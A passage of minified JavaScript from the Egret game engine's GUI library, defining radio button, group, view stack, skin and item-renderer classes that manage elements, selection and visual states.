					e.UIEvent.dispatchUIEvent(this, e.UIEvent.VALUE_COMMIT)
				}
			};
			a.prototype.changeSelection =
			function (b, a) {
				"undefined" === typeof a && (a = !0);
				var c = this.getRadioButtonAt(b);
				c && c != this._selection && (this._selection && (this._selection.selected = !1), this._selection = c, this._selection.selected = !0, a && this.dispatchEventWith(d.Event.CHANGE))
			};
			a.prototype.radioButton_addedHandler = function (b) {
				if (b = b.target)
					b.removeEventListener(d.Event.ADDED, this.radioButton_addedHandler, this), this._addInstance(b)
			};
			a.prototype.radioButton_removedHandler = function (b) {
				if (b = b.target)
					b.removeEventListener(d.Event.REMOVED, this.radioButton_removedHandler,
						this), this.doRemoveInstance(b)
			};
			a.groupCount = 0;
			return a
		}
		(d.EventDispatcher);
		e.RadioButtonGroup = f;
		f.prototype.__class__ = "egret.gui.RadioButtonGroup"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._indexNumber = 0;
				this._radioButtonGroup = null;
				this.groupChanged = !1;
				this._groupName = "radioGroup";
				this.hostComponentKey = "egret.gui.RadioButton";
				this.groupName = "radioGroup"
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "enabled", {
				get : function () {
					return this._enabled ? !this._radioButtonGroup || this._radioButtonGroup.enabled : !1
				},
				set : function (b) {
					this._setEnabled(b)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype,
				"group", {
				get : function () {
					if (!this._group && this._groupName) {
						a.automaticRadioButtonGroups || (a.automaticRadioButtonGroups = {});
						var b = a.automaticRadioButtonGroups[this._groupName];
						b || (b = new d.RadioButtonGroup, b._name = this._groupName, a.automaticRadioButtonGroups[this._groupName] = b);
						this._group = b
					}
					return this._group
				},
				set : function (b) {
					this._group != b && (this._radioButtonGroup && this._radioButtonGroup._removeInstance(this), this._groupName = (this._group = b) ? this.group._name : "radioGroup", this.groupChanged = !0, this.invalidateProperties(),
						this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "groupName", {
				get : function () {
					return this._groupName
				},
				set : function (b) {
					b && "" != b && (this._groupName = b, this._radioButtonGroup && this._radioButtonGroup._removeInstance(this), this._group = null, this.groupChanged = !0, this.invalidateProperties(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setSelected = function (b) {
				c.prototype._setSelected.call(this, b);
				this.invalidateDisplayList()
			};
			Object.defineProperty(a.prototype,
				"value", {
				get : function () {
					return this._value
				},
				set : function (b) {
					this._value != b && (this._value = b, this.selected && this.group && d.UIEvent.dispatchUIEvent(this.group, d.UIEvent.VALUE_COMMIT))
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.commitProperties = function () {
				this.groupChanged && (this.addToGroup(), this.groupChanged = !1);
				c.prototype.commitProperties.call(this)
			};
			a.prototype.updateDisplayList = function (b, a) {
				c.prototype.updateDisplayList.call(this, b, a);
				this.group && (this.selected ? this._group.selection = this : this.group.selection ==
						this && (this._group.selection = null))
			};
			a.prototype.buttonReleased = function () {
				this.enabled && !this.selected && (this._radioButtonGroup || this.addToGroup(), c.prototype.buttonReleased.call(this), this.group._setSelection(this))
			};
			a.prototype.addToGroup = function () {
				var b = this.group;
				b && b._addInstance(this);
				return b
			};
			return a
		}
		(d.ToggleButtonBase);
		d.RadioButton = f;
		f.prototype.__class__ = "egret.gui.RadioButton"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.elementsContentChanged = this.createChildrenCalled = !1;
				this._elementsContent = []
			}
			__extends(a, c);
			a.prototype.createChildren = function () {
				c.prototype.createChildren.call(this);
				this.createChildrenCalled = !0;
				this.elementsContentChanged && (this.elementsContentChanged = !1, this.setElementsContent(this._elementsContent))
			};
			a.prototype._getElementsContent = function () {
				return this._elementsContent
			};
			Object.defineProperty(a.prototype, "elementsContent", {
				set : function (b) {
					null == b && (b = []);
					if (b != this._elementsContent)
						if (this.createChildrenCalled)
							this.setElementsContent(b);
						else {
							this.elementsContentChanged = !0;
							for (var a = this._elementsContent.length - 1; 0 <= a; a--)
								this._elementRemoved(this._elementsContent[a], a);
							this._elementsContent = b
						}
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.setElementsContent = function (b) {
				var a;
				for (a = this._elementsContent.length - 1; 0 <= a; a--)
					this._elementRemoved(this._elementsContent[a], a);
				this._elementsContent = b.concat();
				b = this._elementsContent.length;
				for (a = 0; a < b; a++) {
					var c = this._elementsContent[a];
					c.parent && "removeElement" in c.parent ? c.parent.removeElement(c) : c.owner && "removeElement" in c.owner && c.owner.removeElement(c);
					this._elementAdded(c, a)
				}
			};
			Object.defineProperty(a.prototype, "numElements", {
				get : function () {
					return this._elementsContent.length
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.getElementAt = function (b) {
				this.checkForRangeError(b);
				return this._elementsContent[b]
			};
			a.prototype.checkForRangeError = function (b, a) {
				"undefined" === typeof a && (a = !1);
				var c = this._elementsContent.length - 1;
				a && c++;
				if (0 > b || b > c)
					throw new RangeError('\u7d22\u5f15:"' + b + '"\u8d85\u51fa\u53ef\u89c6\u5143\u7d20\u7d22\u5f15\u8303\u56f4');
			};
			a.prototype.addElement = function (b) {
				var a = this.numElements;
				b.parent == this && (a = this.numElements - 1);
				return this.addElementAt(b, a)
			};
			a.prototype.addElementAt = function (b, a) {
				if (b == this)
					return b;
				this.checkForRangeError(a, !0);
				var c = b.owner;
				if (c == this || b.parent == this)
					return this.setElementIndex(b, a), b;
				c && "removeElement" in c && b.owner.removeElement(b);
				this._elementsContent.splice(a, 0, b);
				this.elementsContentChanged || this._elementAdded(b, a);
				return b
			};
			a.prototype.removeElement = function (b) {
				return this.removeElementAt(this.getElementIndex(b))
			};
			a.prototype.removeElementAt = function (b) {
				this.checkForRangeError(b);
				var a = this._elementsContent[b];
				this.elementsContentChanged || this._elementRemoved(a, b);
				this._elementsContent.splice(b, 1);
				return a
			};
			a.prototype.removeAllElements = function () {
				for (var b = this.numElements - 1; 0 <= b; b--)
					this.removeElementAt(b)
			};
			a.prototype.getElementIndex =
			function (b) {
				return this._elementsContent.indexOf(b)
			};
			a.prototype.setElementIndex = function (b, a) {
				this.checkForRangeError(a);
				var c = this.getElementIndex(b);
				-1 != c && c != a && (this.elementsContentChanged || this._elementRemoved(b, c, !1), this._elementsContent.splice(c, 1), this._elementsContent.splice(a, 0, b), this.elementsContentChanged || this._elementAdded(b, a, !1))
			};
			a.prototype.swapElements = function (b, a) {
				this.swapElementsAt(this.getElementIndex(b), this.getElementIndex(a))
			};
			a.prototype.swapElementsAt = function (b, a) {
				this.checkForRangeError(b);
				this.checkForRangeError(a);
				if (b > a) {
					var c = a;
					a = b;
					b = c
				} else if (b == a)
					return;
				var c = this._elementsContent,
				d = c[b],
				e = c[a];
				this.elementsContentChanged || (this._elementRemoved(d, b, !1), this._elementRemoved(e, a, !1));
				c[b] = e;
				c[a] = d;
				this.elementsContentChanged || (this._elementAdded(e, b, !1), this._elementAdded(d, a, !1))
			};
			a.prototype._elementAdded = function (b, a, c) {
				"undefined" === typeof c && (c = !0);
				b instanceof d.DisplayObject && this._addToDisplayListAt(b, a, c);
				c && this.hasEventListener(e.ElementExistenceEvent.ELEMENT_ADD) && e.ElementExistenceEvent.dispatchElementExistenceEvent(this,
					e.ElementExistenceEvent.ELEMENT_ADD, b, a);
				this.invalidateSize();
				this.invalidateDisplayList()
			};
			a.prototype._elementRemoved = function (b, a, c) {
				"undefined" === typeof c && (c = !0);
				c && this.hasEventListener(e.ElementExistenceEvent.ELEMENT_REMOVE) && e.ElementExistenceEvent.dispatchElementExistenceEvent(this, e.ElementExistenceEvent.ELEMENT_REMOVE, b, a);
				b instanceof d.DisplayObject && b.parent == this && this._removeFromDisplayList(b, c);
				this.invalidateSize();
				this.invalidateDisplayList()
			};
			a.prototype.addChild = function (b) {
				throw Error("addChild()" +
					a.errorStr + "addElement()\u4ee3\u66ff");
			};
			a.prototype.addChildAt = function (b, c) {
				throw Error("addChildAt()" + a.errorStr + "addElementAt()\u4ee3\u66ff");
			};
			a.prototype.removeChild = function (b) {
				throw Error("removeChild()" + a.errorStr + "removeElement()\u4ee3\u66ff");
			};
			a.prototype.removeChildAt = function (b) {
				throw Error("removeChildAt()" + a.errorStr + "removeElementAt()\u4ee3\u66ff");
			};
			a.prototype.setChildIndex = function (b, c) {
				throw Error("setChildIndex()" + a.errorStr + "setElementIndex()\u4ee3\u66ff");
			};
			a.prototype.swapChildren =
			function (b, c) {
				throw Error("swapChildren()" + a.errorStr + "swapElements()\u4ee3\u66ff");
			};
			a.prototype.swapChildrenAt = function (b, c) {
				throw Error("swapChildrenAt()" + a.errorStr + "swapElementsAt()\u4ee3\u66ff");
			};
			a.errorStr = "\u5728\u6b64\u7ec4\u4ef6\u4e2d\u4e0d\u53ef\u7528\uff0c\u82e5\u6b64\u7ec4\u4ef6\u4e3a\u5bb9\u5668\u7c7b\uff0c\u8bf7\u4f7f\u7528";
			return a
		}
		(e.GroupBase);
		e.Group = f;
		f.prototype.__class__ = "egret.gui.Group"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._createAllChildren = !1;
				this.proposedSelectedIndex = a.NO_PROPOSED_SELECTION;
				this._selectedIndex = -1;
				this.childOrderingChanged = this.notifyTabBar = !1;
				this._setLayout(new e.BasicLayout)
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "layout", {
				get : function () {
					return this._layout
				},
				set : function (b) {},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "createAllChildren", {
				get : function () {
					return this._createAllChildren
				},
				set : function (b) {
					if (this._createAllChildren !=
						b && (this._createAllChildren = b)) {
						b = this._getElementsContent();
						for (var a = b.length, c = 0; c < a; c++) {
							var e = b[c];
							e instanceof d.DisplayObject && e.parent != this && (this.childOrderingChanged = !0, this._addToDisplayList(e))
						}
						this.childOrderingChanged && this.invalidateProperties()
					}
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "selectedChild", {
				get : function () {
					var b = this.selectedIndex;
					return 0 <= b && b < this.numElements ? this.getElementAt(b) : null
				},
				set : function (b) {
					b = this.getElementIndex(b);
					0 <= b && b < this.numElements &&
					this._setSelectedIndex(b)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "selectedIndex", {
				get : function () {
					return this.proposedSelectedIndex != a.NO_PROPOSED_SELECTION ? this.proposedSelectedIndex : this._selectedIndex
				},
				set : function (b) {
					this._setSelectedIndex(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setSelectedIndex = function (b, a) {
				"undefined" === typeof a && (a = !0);
				b != this.selectedIndex && (this.proposedSelectedIndex = b, this.invalidateProperties(), e.UIEvent.dispatchUIEvent(this, e.UIEvent.VALUE_COMMIT),
					this.notifyTabBar = this.notifyTabBar || a)
			};
			a.prototype._elementAdded = function (b, a, c) {
				"undefined" === typeof c && (c = !0);
				this._createAllChildren && b instanceof d.DisplayObject && this._addToDisplayListAt(b, a, c);
				c && this.hasEventListener(e.ElementExistenceEvent.ELEMENT_ADD) && e.ElementExistenceEvent.dispatchElementExistenceEvent(this, e.ElementExistenceEvent.ELEMENT_ADD, b, a);
				b.visible = !1;
				b.includeInLayout = !1;
				-1 == this.selectedIndex ? this._setSelectedIndex(a, !1) : a <= this.selectedIndex && this.initialized && this._setSelectedIndex(this.selectedIndex +
					1);
				this.dispatchCoEvent(e.CollectionEventKind.ADD, a, -1, [b.name])
			};
			a.prototype._elementRemoved = function (b, a, d) {
				"undefined" === typeof d && (d = !0);
				c.prototype._elementRemoved.call(this, b, a, d);
				b.visible = !0;
				b.includeInLayout = !0;
				a == this.selectedIndex ? 0 < this.numElements ? 0 == a ? (this.proposedSelectedIndex = 0, this.invalidateProperties()) : this._setSelectedIndex(0, !1) : this._setSelectedIndex(-1) : a < this.selectedIndex && this._setSelectedIndex(this.selectedIndex - 1);
				this.dispatchCoEvent(e.CollectionEventKind.REMOVE, a, -1,
					[b.name])
			};
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				this.proposedSelectedIndex != a.NO_PROPOSED_SELECTION && (this.commitSelection(this.proposedSelectedIndex), this.proposedSelectedIndex = a.NO_PROPOSED_SELECTION);
				if (this.childOrderingChanged) {
					this.childOrderingChanged = !1;
					for (var b = this._getElementsContent(), e = b.length, f = 0; f < e; f++) {
						var y = b[f];
						y instanceof d.DisplayObject && y.parent == this && this._addToDisplayList(y)
					}
				}
				this.notifyTabBar && (this.notifyTabBar = !0, this.dispatchEventWith("IndexChanged"))
			};
			a.prototype.commitSelection = function (b) {
				0 <= b && b < this.numElements ? (this._selectedIndex = b, this._selectedChild && this._selectedChild.parent == this && (this._selectedChild.visible = !1, this._selectedChild.includeInLayout = !1), this._selectedChild = this.getElementAt(this._selectedIndex), this._selectedChild.visible = !0, this._selectedChild.includeInLayout = !0, this._selectedChild.parent != this && this._selectedChild instanceof d.DisplayObject && (this._addToDisplayList(this._selectedChild), this.childOrderingChanged || (this.childOrderingChanged =
								!0))) : (this._selectedChild = null, this._selectedIndex = -1);
				this.invalidateSize();
				this.invalidateDisplayList()
			};
			Object.defineProperty(a.prototype, "length", {
				get : function () {
					return this.numElements
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.getItemAt = function (b) {
				return (b = this.getElementAt(b)) ? b.name : ""
			};
			a.prototype.getItemIndex = function (b) {
				for (var a = this._getElementsContent(), c = a.length, d = 0; d < c; d++)
					if (a[d].name === b)
						return d;
				return -1
			};
			a.prototype.dispatchCoEvent = function (b, a, c, d, f) {
				"undefined" === typeof b &&
				(b = null);
				"undefined" === typeof a && (a = -1);
				"undefined" === typeof c && (c = -1);
				"undefined" === typeof d && (d = null);
				"undefined" === typeof f && (f = null);
				e.CollectionEvent.dispatchCollectionEvent(this, e.CollectionEvent.COLLECTION_CHANGE, b, a, c, d, f)
			};
			a.NO_PROPOSED_SELECTION = -2;
			return a
		}
		(e.Group);
		e.ViewStack = f;
		f.prototype.__class__ = "egret.gui.ViewStack"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.maxWidth = 1E4;
				this.minWidth = 0;
				this.maxHeight = 1E4;
				this.minHeight = 0;
				this.height = this.width = NaN;
				this._initialized = !1;
				this._elementsContent = [];
				this._states = [];
				this.initialized = !1
			}
			__extends(a, c);
			a.prototype.createChildren = function () {};
			Object.defineProperty(a.prototype, "hostComponent", {
				get : function () {
					return this._hostComponent
				},
				set : function (b) {
					this._setHostComponent(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setHostComponent =
			function (b) {
				if (this._hostComponent != b) {
					var a;
					if (this._hostComponent)
						for (a = this._elementsContent.length - 1; 0 <= a; a--)
							this._elementRemoved(this._elementsContent[a], a);
					this._hostComponent = b;
					this._initialized || (this._initialized = !0, this.createChildren());
					if (this._hostComponent) {
						b = this._elementsContent.length;
						for (a = 0; a < b; a++)
							this._elementAdded(this._elementsContent[a], a);
						this.initializeStates();
						this.currentStateChanged && this.commitCurrentState()
					}
				}
			};
			a.prototype._getElementsContent = function () {
				return this._elementsContent
			};
			Object.defineProperty(a.prototype, "elementsContent", {
				set : function (b) {
					null == b && (b = []);
					if (b != this._elementsContent)
						if (this._hostComponent) {
							var a;
							for (a = this._elementsContent.length - 1; 0 <= a; a--)
								this._elementRemoved(this._elementsContent[a], a);
							this._elementsContent = b.concat();
							b = this._elementsContent.length;
							for (a = 0; a < b; a++) {
								var c = this._elementsContent[a];
								c.parent && "removeElement" in c.parent ? c.parent.removeElement(c) : c.owner && "removeElement" in c.owner && c.owner.removeElement(c);
								this._elementAdded(c, a)
							}
						} else
							this._elementsContent =
								b.concat()
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "numElements", {
				get : function () {
					return this._elementsContent.length
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.getElementAt = function (b) {
				this.checkForRangeError(b);
				return this._elementsContent[b]
			};
			a.prototype.checkForRangeError = function (b, a) {
				"undefined" === typeof a && (a = !1);
				var c = this._elementsContent.length - 1;
				a && c++;
				if (0 > b || b > c)
					throw new RangeError('\u7d22\u5f15:"' + b + '"\u8d85\u51fa\u53ef\u89c6\u5143\u7d20\u7d22\u5f15\u8303\u56f4');
			};
			a.prototype.addElement = function (b) {
				var a = this.numElements;
				b.owner == this && (a = this.numElements - 1);
				return this.addElementAt(b, a)
			};
			a.prototype.addElementAt = function (b, a) {
				this.checkForRangeError(a, !0);
				var c = b.owner;
				if (c == this)
					return this.setElementIndex(b, a), b;
				c && "removeElement" in c && c.removeElement(b);
				this._elementsContent.splice(a, 0, b);
				this._hostComponent ? this._elementAdded(b, a) : b.ownerChanged(this);
				return b
			};
			a.prototype.removeElement = function (b) {
				return this.removeElementAt(this.getElementIndex(b))
			};
			a.prototype.removeElementAt = function (b) {
				this.checkForRangeError(b);
				var a = this._elementsContent[b];
				this._hostComponent ? this._elementRemoved(a, b) : a.ownerChanged(null);
				this._elementsContent.splice(b, 1);
				return a
			};
			a.prototype.getElementIndex = function (b) {
				return this._elementsContent.indexOf(b)
			};
			a.prototype.setElementIndex = function (b, a) {
				this.checkForRangeError(a);
				var c = this.getElementIndex(b);
				-1 != c && c != a && (this._hostComponent && this._elementRemoved(b, c, !1), this._elementsContent.splice(c, 1), this._elementsContent.splice(a,
						0, b), this._hostComponent && this._elementAdded(b, a, !1))
			};
			a.prototype._elementAdded = function (b, a, c) {
				"undefined" === typeof c && (c = !0);
				b.ownerChanged(this);
				b instanceof d.DisplayObject && this._hostComponent._addToDisplayListAt(b, a, c);
				c && this.hasEventListener(e.ElementExistenceEvent.ELEMENT_ADD) && e.ElementExistenceEvent.dispatchElementExistenceEvent(this, e.ElementExistenceEvent.ELEMENT_ADD, b, a);
				this._hostComponent.invalidateSize();
				this._hostComponent.invalidateDisplayList()
			};
			a.prototype._elementRemoved = function (b,
				a, c) {
				"undefined" === typeof c && (c = !0);
				c && this.hasEventListener(e.ElementExistenceEvent.ELEMENT_REMOVE) && e.ElementExistenceEvent.dispatchElementExistenceEvent(this, e.ElementExistenceEvent.ELEMENT_REMOVE, b, a);
				b instanceof d.DisplayObject && b.parent == this._hostComponent && this._hostComponent._removeFromDisplayList(b, c);
				b.ownerChanged(null);
				this._hostComponent.invalidateSize();
				this._hostComponent.invalidateDisplayList()
			};
			Object.defineProperty(a.prototype, "states", {
				get : function () {
					return this._states
				},
				set : function (b) {
					this._setStates(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setStates = function (b) {
				b || (b = []);
				if ("string" == typeof b[0])
					for (var a = b.length, c = 0; c < a; c++) {
						var d = new e.State(b[c], []);
						b[c] = d
					}
				this._states = b;
				this.currentStateChanged = !0;
				this.requestedCurrentState = this._currentState;
				this.hasState(this.requestedCurrentState) || (this.requestedCurrentState = this.getDefaultState())
			};
			Object.defineProperty(a.prototype, "currentState", {
				get : function () {
					return this.currentStateChanged ? this.requestedCurrentState : this._currentState ? this._currentState :
					this.getDefaultState()
				},
				set : function (b) {
					b || (b = this.getDefaultState());
					b != this.currentState && b && this.currentState && (this.requestedCurrentState = b, this.currentStateChanged = !0, this._hostComponent && this.commitCurrentState())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.hasState = function (b) {
				return null != this.getState(b)
			};
			a.prototype.getDefaultState = function () {
				return 0 < this._states.length ? this._states[0].name : null
			};
			a.prototype.commitCurrentState = function () {
				if (this.currentStateChanged) {
					this.currentStateChanged =
						!1;
					this.getState(this.requestedCurrentState) || (this.requestedCurrentState = this.getDefaultState());
					var b = this._currentState ? this._currentState : "";
					this.hasEventListener(e.StateChangeEvent.CURRENT_STATE_CHANGING) && e.StateChangeEvent.dispatchStateChangeEvent(this, e.StateChangeEvent.CURRENT_STATE_CHANGING, b, this.requestedCurrentState ? this.requestedCurrentState : "");
					this.removeState(this._currentState);
					(this._currentState = this.requestedCurrentState) && this.applyState(this._currentState);
					this.hasEventListener(e.StateChangeEvent.CURRENT_STATE_CHANGE) &&
					e.StateChangeEvent.dispatchStateChangeEvent(this, e.StateChangeEvent.CURRENT_STATE_CHANGE, b, this._currentState ? this._currentState : "")
				}
			};
			a.prototype.getState = function (b) {
				if (!b)
					return null;
				for (var a = this._states, c = a.length, d = 0; d < c; d++) {
					var e = a[d];
					if (e.name == b)
						return e
				}
				return null
			};
			a.prototype.removeState = function (b) {
				if (b = this.getState(b)) {
					b = b.overrides;
					for (var a = b.length - 1; 0 <= a; a--)
						b[a].remove(this)
				}
			};
			a.prototype.applyState = function (b) {
				if (b = this.getState(b)) {
					b = b.overrides;
					for (var a = b.length, c = 0; c < a; c++)
						b[c].apply(this)
				}
			};
			a.prototype.initializeStates = function () {
				if (!this.initialized) {
					this.initialized = !0;
					for (var b = this._states, a = b.length, c = 0; c < a; c++)
						b[c].initialize(this)
				}
			};
			return a
		}
		(d.EventDispatcher);
		e.Skin = f;
		f.prototype.__class__ = "egret.gui.Skin"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.useVirtualLayoutChanged = !1;
				this.rendererToClassMap = [];
				this.freeRenderers = [];
				this.dataProviderChanged = this.createNewRendererFlag = !1;
				this.recyclerDic = [];
				this.typicalItemChanged = this.virtualLayoutUnderway = this.itemRendererSkinNameChange = !1;
				this.indexToRenderer = [];
				this.renderersBeingUpdated = this.cleanFreeRenderer = !1
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "layout", {
				get : function () {
					return this._layout
				},
				set : function (b) {
					b !=
					this.layout && (this.layout && (this.layout.typicalLayoutRect = null, this.layout.removeEventListener("useVirtualLayoutChanged", this.layout_useVirtualLayoutChangedHandler, this)), this.layout && b && this.layout.useVirtualLayout != b.useVirtualLayout && this.changeUseVirtualLayout(), this._setLayout(b), b && (b.typicalLayoutRect = this.typicalLayoutRect, b.addEventListener("useVirtualLayoutChanged", this.layout_useVirtualLayoutChangedHandler, this)))
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.layout_useVirtualLayoutChangedHandler =
			function (b) {
				this.changeUseVirtualLayout()
			};
			a.prototype.setVirtualElementIndicesInView = function (b, a) {
				if (this.layout && this.layout.useVirtualLayout) {
					this.virtualRendererIndices = [];
					for (var c = b; c <= a; c++)
						this.virtualRendererIndices.push(c);
					for (var d in this.indexToRenderer)
						d = parseInt(d), -1 == this.virtualRendererIndices.indexOf(d) && this.freeRendererByIndex(d)
				}
			};
			a.prototype.getVirtualElementAt = function (b) {
				if (0 > b || b >= this.dataProvider.length)
					return null;
				var a = this.indexToRenderer[b];
				if (!a) {
					var a = this.dataProvider.getItemAt(b),
					c = this.createVirtualRenderer(b);
					this.indexToRenderer[b] = c;
					this.updateRenderer(c, b, a);
					this.createNewRendererFlag && ("validateNow" in c && c.validateNow(), this.createNewRendererFlag = !1, e.RendererExistenceEvent.dispatchRendererExistenceEvent(this, e.RendererExistenceEvent.RENDERER_ADD, c, b, a));
					a = c
				}
				return a
			};
			a.prototype.freeRendererByIndex = function (b) {
				if (this.indexToRenderer[b]) {
					var a = this.indexToRenderer[b];
					delete this.indexToRenderer[b];
					a && a instanceof d.DisplayObject && this.doFreeRenderer(a)
				}
			};
			a.prototype.doFreeRenderer =
			function (b) {
				var a = this.rendererToClassMap[b.hashCode].hashCode;
				this.freeRenderers[a] || (this.freeRenderers[a] = []);
				this.freeRenderers[a].push(b);
				b.visible = !1
			};
			a.prototype.invalidateSize = function () {
				this.createNewRendererFlag || c.prototype.invalidateSize.call(this)
			};
			a.prototype.createVirtualRenderer = function (b) {
				b = this.dataProvider.getItemAt(b);
				b = this.itemToRendererClass(b);
				var a = b.hashCode,
				c = this.freeRenderers;
				if (c[a] && 0 < c[a].length)
					return b = c[a].pop(), b.visible = !0, b;
				this.createNewRendererFlag = !0;
				return this.createOneRenderer(b)
			};
			a.prototype.createOneRenderer = function (b) {
				var a,
				c = b.hashCode,
				e = this.recyclerDic[c];
				e && (a = e.pop(), 0 == e.length && delete this.recyclerDic[c]);
				a || (a = b.newInstance(), this.rendererToClassMap[a.hashCode] = b);
				if (!(a && a instanceof d.DisplayObject))
					return null;
				this._itemRendererSkinName && this.setItemRenderSkinName(a);
				this._addToDisplayList(a);
				a.setLayoutBoundsSize(NaN, NaN);
				return a
			};
			a.prototype.setItemRenderSkinName = function (b) {
				b && (b ? b._skinNameExplicitlySet || (b.skinName = this._itemRendererSkinName) : b && !b.skinName &&
					(b.skinName = this._itemRendererSkinName))
			};
			a.prototype.finishVirtualLayout = function () {
				if (this.virtualLayoutUnderway) {
					var b = this.virtualLayoutUnderway = !1,
					a;
					for (a in this.freeRenderers)
						if (0 < this.freeRenderers[a].length) {
							b = !0;
							break
						}
					b && (this.cleanTimer || (this.cleanTimer = new d.Timer(3E3, 1), this.cleanTimer.addEventListener(d.TimerEvent.TIMER, this.cleanAllFreeRenderer, this)), this.cleanTimer.reset(), this.cleanTimer.start())
				}
			};
			a.prototype.cleanAllFreeRenderer = function (b) {
				var a = this.freeRenderers,
				c;
				for (c in a)
					for (var d =
							a[c], e = d.length, f = 0; f < e; f++)
						b = d[f], b.visible = !0, this.recycle(b);
				this.freeRenderers = [];
				this.cleanFreeRenderer = !1
			};
			a.prototype.getElementIndicesInView = function () {
				return this.layout && this.layout.useVirtualLayout ? this.virtualRendererIndices ? this.virtualRendererIndices : [] : c.prototype.getElementIndicesInView.call(this)
			};
			a.prototype.changeUseVirtualLayout = function () {
				this.cleanFreeRenderer = this.useVirtualLayoutChanged = !0;
				this.removeDataProviderListener();
				this.invalidateProperties()
			};
			Object.defineProperty(a.prototype,
				"dataProvider", {
				get : function () {
					return this._dataProvider
				},
				set : function (b) {
					this._dataProvider != b && (this.removeDataProviderListener(), this._dataProvider = b, this.cleanFreeRenderer = this.dataProviderChanged = !0, this.invalidateProperties(), this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.removeDataProviderListener = function () {
				this._dataProvider && this._dataProvider.removeEventListener(e.CollectionEvent.COLLECTION_CHANGE, this.onCollectionChange, this)
			};
			a.prototype.onCollectionChange =
			function (b) {
				switch (b.kind) {
				case e.CollectionEventKind.ADD:
					this.itemAddedHandler(b.items, b.location);
					break;
				case e.CollectionEventKind.MOVE:
					this.itemMovedHandler(b.items[0], b.location, b.oldLocation);
					break;
				case e.CollectionEventKind.REMOVE:
					this.itemRemovedHandler(b.items, b.location);
					break;
				case e.CollectionEventKind.UPDATE:
					this.itemUpdatedHandler(b.items[0], b.location);
					break;
				case e.CollectionEventKind.REPLACE:
					this.itemRemoved(b.oldItems[0], b.location);
					this.itemAdded(b.items[0], b.location);
					break;
				case e.CollectionEventKind.RESET:
				case e.CollectionEventKind.REFRESH:
					if (this.layout &&
						this.layout.useVirtualLayout)
						for (var a in this.indexToRenderer)
							a = parseInt(a), this.freeRendererByIndex(a);
					this.dataProviderChanged = !0;
					this.invalidateProperties()
				}
				this.invalidateSize();
				this.invalidateDisplayList()
			};
			a.prototype.itemAddedHandler = function (b, a) {
				for (var c = b.length, d = 0; d < c; d++)
					this.itemAdded(b[d], a + d);
				this.resetRenderersIndices()
			};
			a.prototype.itemMovedHandler = function (b, a, c) {
				this.itemRemoved(b, c);
				this.itemAdded(b, a);
				this.resetRenderersIndices()
			};
			a.prototype.itemRemovedHandler = function (b,
				a) {
				for (var c = b.length - 1; 0 <= c; c--)
					this.itemRemoved(b[c], a + c);
				this.resetRenderersIndices()
			};
			a.prototype.itemAdded = function (b, a) {
				this.layout && this.layout.elementAdded(a);
				if (this.layout && this.layout.useVirtualLayout) {
					var c = this.virtualRendererIndices;
					if (c) {
						for (var d = c.length, f = 0; f < d; f++) {
							var g = c[f];
							g >= a && (c[f] = g + 1)
						}
						this.indexToRenderer.splice(a, 0, null)
					}
				} else
					c = this.itemToRendererClass(b), c = this.createOneRenderer(c), this.indexToRenderer.splice(a, 0, c), c && (this.updateRenderer(c, a, b), e.RendererExistenceEvent.dispatchRendererExistenceEvent(this,
							e.RendererExistenceEvent.RENDERER_ADD, c, a, b))
			};
			a.prototype.itemRemoved = function (b, a) {
				this.layout && this.layout.elementRemoved(a);
				var c = this.virtualRendererIndices;
				if (c && 0 < c.length) {
					for (var f = -1, h = c.length, g = 0; g < h; g++) {
						var l = c[g];
